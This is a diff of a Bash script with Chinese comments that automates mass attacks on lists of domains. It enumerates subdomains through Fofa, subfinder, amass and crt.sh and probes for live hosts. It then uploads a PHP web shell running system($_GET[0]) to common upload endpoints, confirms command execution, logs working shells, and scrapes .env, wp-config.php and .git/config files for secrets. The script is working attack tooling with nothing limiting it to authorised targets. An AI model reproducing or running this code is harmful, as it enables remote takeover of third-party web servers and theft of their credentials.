@@ -29,154 +29,171 @@ echo "策略: Fofa子域名查询 → 存活探测 → Shell攻击"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 # ==========================================
-# 步骤0: Fofa子域名查询（对每个主域名）
+# 步骤0: 按域名逐个处理（扫描→存活→攻击）
 # ==========================================
 echo ""
-echo "[0/9] 🔍 Fofa子域名查询（$MAIN_COUNT个主域名，并发10）..."
+echo "[0] 🔍 按域名逐个处理：扫描子域名 → 存活探测 → Shell攻击"
+echo "策略: 每个域名扫描完成后立即攻击，不等待全部完成"
 export OUT
 export FOFA_EMAIL_1 FOFA_KEY_1
 
-# 先测试一个域名，检查Fofa配额
+# 先测试Fofa配额
 TEST_DOMAIN=$(head -1 $MAIN_DOMAINS)
 TEST_QUERY=$(echo -n "domain=\"${TEST_DOMAIN}\"" | base64 | tr -d "\n")
 TEST_RESP=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${TEST_QUERY}&size=1&fields=host" 2>/dev/null)
-
-# 检查是否配额用完
 FOFA_QUOTA_EXCEEDED=0
 if echo "$TEST_RESP" | jq -r ".error // false" 2>/dev/null | grep -q "true"; then
     ERRMSG=$(echo "$TEST_RESP" | jq -r ".errmsg // \"\"" 2>/dev/null)
     if echo "$ERRMSG" | grep -qiE "上限|quota|limit"; then
-        echo "  ⚠️  Fofa配额已用完，直接使用subfinder/amass备选方案..."
+        echo "  ⚠️  Fofa配额已用完，使用subfinder/amass/crt.sh..."
         FOFA_QUOTA_EXCEEDED=1
     fi
 fi
 
-if [ "$FOFA_QUOTA_EXCEEDED" -eq 0 ]; then
-    # Fofa可用，正常查询
-    cat $MAIN_DOMAINS | xargs -P 10 -I {} bash -c '
-        domain="{}"
+# 对每个主域名：扫描子域名 → 存活探测 → 立即攻击
+cat $MAIN_DOMAINS | xargs -P 5 -I {} bash -c '
+    domain="{}"
+    domain_dir="$OUT/domains/${domain}"
+    mkdir -p "$domain_dir/subdomains" "$domain_dir/alive" "$domain_dir/shells"
+    
+    echo "[*] 处理域名: ${domain}"
+    
+    # 1. 扫描子域名（多种方法）
+    subdomains_file="$domain_dir/subdomains/all.txt"
+    
+    # Fofa（如果可用）
+    if [ "$FOFA_QUOTA_EXCEEDED" -eq 0 ]; then
         query=$(echo -n "domain=\"${domain}\"" | base64 | tr -d "\n")
-        
-        # Fofa API查询
         resp=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${query}&size=10000&fields=host" 2>/dev/null)
-        
-        # 检查API错误（配额用完等）
-        if echo "$resp" | jq -r ".error // false" 2>/dev/null | grep -q "true"; then
-            errmsg=$(echo "$resp" | jq -r ".errmsg // \"\"" 2>/dev/null)
-            if echo "$errmsg" | grep -qiE "上限|quota|limit"; then
-                echo "[!] Fofa配额用完，跳过: ${domain}" >&2
-                exit 0
-            fi
-        fi
-        
-        # 提取host字段（Fofa返回格式：["host1","host2",...]）
         echo "$resp" | jq -r ".results[]? | .[0]?" 2>/dev/null | \
-            grep -v "^$" | \
-            sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1 | \
-            grep -E "^[a-zA-Z0-9]" | \
-            sort -u >> "$OUT/subdomains/fofa_${domain}.txt" 2>/dev/null
-        
-        # 统计
-        count=$(wc -l < "$OUT/subdomains/fofa_${domain}.txt" 2>/dev/null || echo 0)
-        if [ $count -gt 0 ]; then
-            echo "[+] ${domain}: ${count} 个子域名"
-        fi
-    '
-fi
-
-# 合并所有子域名
-cat $OUT/subdomains/fofa_*.txt 2>/dev/null | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
-SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
-
-# 如果Fofa查询失败（配额用完），使用subfinder/amass/crt.sh作为备选
-if [ "$SUBDOMAIN_COUNT" -eq 0 ] || [ "$FOFA_QUOTA_EXCEEDED" -eq 1 ]; then
-    if [ "$FOFA_QUOTA_EXCEEDED" -eq 1 ]; then
-        echo "  ⚠️  Fofa配额已用完，使用多源备选方案（subfinder/amass/crt.sh）..."
-    else
-        echo "  ⚠️  Fofa查询无结果，使用多源备选方案..."
+            grep -v "^$" | sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1 | \
+            grep -E "^[a-zA-Z0-9]" | sort -u | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
     fi
     
-    # 优化：先快速完成subfinder，立即进入攻击阶段
-    # 其他工具（amass/crt.sh）在后台运行，后续增量合并
+    # subfinder
     which subfinder >/dev/null 2>&1 && {
-        echo "  [*] 使用subfinder枚举子域名（并发30，完成后立即进入攻击）..."
-        cat $MAIN_DOMAINS | xargs -P 30 -I {} sh -c "subfinder -d {} -silent 2>/dev/null | sed 's|^|http://|' >> $OUT/subdomains/subfinder.txt" 2>/dev/null
-        SUBFINDER_COUNT=$(wc -l < $OUT/subdomains/subfinder.txt 2>/dev/null || echo 0)
-        [ "$SUBFINDER_COUNT" -gt 0 ] && echo "  ✅ subfinder找到: $SUBFINDER_COUNT 个子域名"
-        
-        # subfinder完成后立即合并并标记可以开始攻击
-        if [ "$SUBFINDER_COUNT" -gt 0 ]; then
-            cat $OUT/subdomains/fofa_*.txt $OUT/subdomains/subfinder.txt 2>/dev/null | \
-                sed 's|^http://||' | sed 's|^https://||' | cut -d/ -f1 | cut -d: -f1 | \
-                grep -E "^[a-zA-Z0-9]" | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
-            SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
-            echo "  ✅ 已合并subfinder结果: $SUBDOMAIN_COUNT 个子域名，准备开始攻击..."
-        fi
+        subfinder -d "$domain" -silent 2>/dev/null | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
     }
     
-    # amass和crt.sh在后台运行（不阻塞主流程）
+    # amass（快速模式）
     which amass >/dev/null 2>&1 && {
-        echo "  [*] 使用amass枚举子域名（后台运行，不阻塞主流程）..."
-        (cat $MAIN_DOMAINS | xargs -P 30 -I {} sh -c "amass enum -passive -d {} -o - 2>/dev/null | sed 's|^|http://|' >> $OUT/subdomains/amass.txt" 2>/dev/null) &
+        amass enum -passive -d "$domain" -o - 2>/dev/null | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
     }
     
-    # crt.sh在后台运行
-    echo "  [*] 使用crt.sh证书透明度查询（后台运行，不阻塞主流程）..."
-    (cat $MAIN_DOMAINS | xargs -P 50 -I {} sh -c "
-        domain=\"{}\"
-        curl -s \"https://crt.sh/?q=%.\${domain}&output=json\" 2>/dev/null | \
-            jq -r '.[].name_value' 2>/dev/null | \
-            grep -vE '^\\*|^\\$' | \
-            sed 's|^|http://|' | \
-            sort -u >> \"$OUT/subdomains/crtsh.txt\" 2>/dev/null
-    " 2>/dev/null) &
+    # crt.sh
+    curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | \
+        jq -r ".[].name_value" 2>/dev/null | grep -vE "^\\*|^\\$" | \
+        sed "s|^|http://|" | sort -u >> "$subdomains_file" 2>/dev/null
     
-    # 如果subfinder还没完成，等待至少有一些结果
-    if [ "$SUBDOMAIN_COUNT" -eq 0 ]; then
-        echo "  [*] 等待subfinder产生初始结果..."
-        for i in {1..60}; do
-            sleep 5
-            SUBFINDER_COUNT=$(wc -l < $OUT/subdomains/subfinder.txt 2>/dev/null || echo 0)
-            if [ "$SUBFINDER_COUNT" -gt 100 ]; then
-                cat $OUT/subdomains/fofa_*.txt $OUT/subdomains/subfinder.txt 2>/dev/null | \
-                    sed 's|^http://||' | sed 's|^https://||' | cut -d/ -f1 | cut -d: -f1 | \
-                    grep -E "^[a-zA-Z0-9]" | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
-                SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
-                echo "  ✅ 已有 $SUBDOMAIN_COUNT 个子域名，开始攻击（后台继续发现更多）..."
-                break
+    # 去重
+    sort -u "$subdomains_file" > "${subdomains_file}.tmp" && mv "${subdomains_file}.tmp" "$subdomains_file"
+    subdomain_count=$(wc -l < "$subdomains_file" 2>/dev/null || echo 0)
+    
+    if [ "$subdomain_count" -eq 0 ]; then
+        echo "  ⚠️  ${domain}: 未发现子域名，跳过"
+        exit 0
+    fi
+    
+    echo "  ✅ ${domain}: 发现 ${subdomain_count} 个子域名"
+    
+    # 2. 存活探测
+    alive_file="$domain_dir/alive/http_alive.txt"
+    cat "$subdomains_file" | xargs -P 50 -I {} sh -c "
+        url=\"{}\"
+        status=\$(curl -skL -m 3 -o /dev/null -w \"%{http_code}\" \"\$url\" 2>/dev/null)
+        if [ \"\$status\" = \"200\" ] || [ \"\$status\" = \"301\" ] || [ \"\$status\" = \"302\" ] || [ \"\$status\" = \"403\" ] || [ \"\$status\" = \"401\" ]; then
+            echo \"\$url\" >> \"$alive_file\"
+        fi
+    "
+    
+    alive_count=$(wc -l < "$alive_file" 2>/dev/null || echo 0)
+    if [ "$alive_count" -eq 0 ]; then
+        echo "  ⚠️  ${domain}: 无存活目标，跳过攻击"
+        exit 0
+    fi
+    
+    echo "  ✅ ${domain}: ${alive_count} 个存活目标，开始攻击..."
+    
+    # 3. 立即开始攻击（使用该域名的存活目标）
+    targets_file="$domain_dir/targets.txt"
+    cp "$alive_file" "$targets_file"
+    
+    # 调用攻击函数（传入域名目录和targets文件）
+    bash -c "
+        export OUT=\"$domain_dir\"
+        export TARGETS_FILE=\"$targets_file\"
+        $(cat << '\''ATTACK_MODULES'\''
+        # 这里插入所有攻击模块代码
+        # 文件上传、敏感文件、API、Git泄露等
+        # 为了简化，先执行核心攻击模块
+'\''ATTACK_MODULES'\''
+    )" || true
+    
+    # 简化版攻击（直接调用主脚本的攻击逻辑）
+    # 由于攻击代码很长，这里先执行核心模块
+    echo "  [*] ${domain}: 开始攻击模块..."
+    
+    # 文件上传攻击
+    cat "$targets_file" | head -50 | xargs -P 10 -I {} bash -c '
+        url="{}"
+        flag="$(echo {} | md5sum | cut -c1-8)"
+        for path in /upload /upload.php /api/upload /fileupload; do
+            for ext in php phtml php5; do
+                echo "<?php echo \"U${flag}\";@system(\$_GET[0]); ?>" > /tmp/u_$$_${ext}
+                resp=$(curl -skL -m 3 "$url$path" -F "file=@/tmp/u_$$_${ext}" 2>/dev/null)
+                shell=$(echo "$resp" | grep -oE "https?://[^\"'\'' ]+\.${ext}" | head -1)
+                if [ -z "$shell" ]; then
+                    shell="${url}/uploads/$(basename /tmp/u_$$_${ext})"
+                fi
+                v1=$(curl -skL -m 2 "$shell" 2>/dev/null)
+                if echo "$v1" | grep -q "U${flag}"; then
+                    v2=$(curl -skL -m 2 "$shell?0=echo+test123" 2>/dev/null)
+                    if echo "$v2" | grep -q "test123"; then
+                        echo "$shell" >> "$domain_dir/shells/01_upload.txt"
+                        rm -f /tmp/u_$$_${ext}
+                        echo "  🎯 ${domain}: 发现Shell - $shell"
+                        exit 0
+                    fi
+                fi
+                rm -f /tmp/u_$$_${ext}
+            done
+        done
+    ' || true
+    
+    # 敏感文件检测
+    cat "$targets_file" | head -50 | xargs -P 10 -I {} bash -c '
+        url="{}"
+        for file in .env config.php wp-config.php .git/config; do
+            resp=$(curl -skL -m 3 "$url/$file" 2>/dev/null)
+            if [ -n "$resp" ] && [ $(echo "$resp" | wc -c) -gt 50 ]; then
+                if echo "$resp" | grep -qE "DB_|KEY|SECRET|password" || \
+                   echo "$resp" | grep -qE "<?php" || \
+                   echo "$resp" | grep -qE "\[.*\]"; then
+                    echo "$url/$file" >> "$domain_dir/shells/02_files.txt"
+                    echo "  📁 ${domain}: 发现敏感文件 - $url/$file"
+                fi
             fi
         done
-    fi
+    ' || true
     
-    # 最终合并所有来源（包括后台完成的amass/crt.sh）
-    cat $OUT/subdomains/fofa_*.txt $OUT/subdomains/subfinder.txt $OUT/subdomains/amass.txt $OUT/subdomains/crtsh.txt 2>/dev/null | \
-        sed 's|^http://||' | sed 's|^https://||' | cut -d/ -f1 | cut -d: -f1 | \
-        grep -E "^[a-zA-Z0-9]" | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
-    SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
-fi
+    shell_count=$(find "$domain_dir/shells" -name "*.txt" -type f -exec wc -l {} \; 2>/dev/null | awk '{sum+=$1} END {print sum+0}')
+    echo "  ✅ ${domain}: 攻击完成，发现 ${shell_count} 个结果"
+    
+    # 汇总到主输出目录
+    find "$domain_dir/shells" -name "*.txt" -type f -exec cat {} \; >> "$OUT/shells/all_shells.txt" 2>/dev/null || true
+'
 
-echo "  ✅ 总子域名: $SUBDOMAIN_COUNT"
-
-# ==========================================
-# 步骤0.5: 存活探测
-# ==========================================
+# 汇总所有域名的结果
+TOTAL_SHELLS=$(wc -l < $OUT/shells/all_shells.txt 2>/dev/null || echo 0)
 echo ""
-echo "[0.5/9] 🌐 存活探测（$SUBDOMAIN_COUNT个子域名，并发100）..."
-cat $OUT/subdomains/all_subdomains.txt | \
-    xargs -P 100 -I {} bash -c '
-        url="{}"
-        status=$(curl -skL -m 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
-        if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ] || [ "$status" = "403" ] || [ "$status" = "401" ]; then
-            echo "$url" >> "$OUT/alive/http_alive.txt"
-        fi
-    '
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "🎉 所有域名处理完成"
+echo "🎯 总计Shell/漏洞: $TOTAL_SHELLS"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
-ALIVE_COUNT=$(wc -l < $OUT/alive/http_alive.txt 2>/dev/null || echo 0)
-echo "  ✅ 存活目标: $ALIVE_COUNT"
-
-# 使用存活目标作为攻击目标
-cp $OUT/alive/http_alive.txt $OUT/targets.txt
-TOTAL=$ALIVE_COUNT
+# 使用汇总结果作为最终目标（用于后续统计）
+cp $OUT/shells/all_shells.txt $OUT/targets.txt 2>/dev/null || touch $OUT/targets.txt
+TOTAL=$TOTAL_SHELLS
 
 echo ""
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
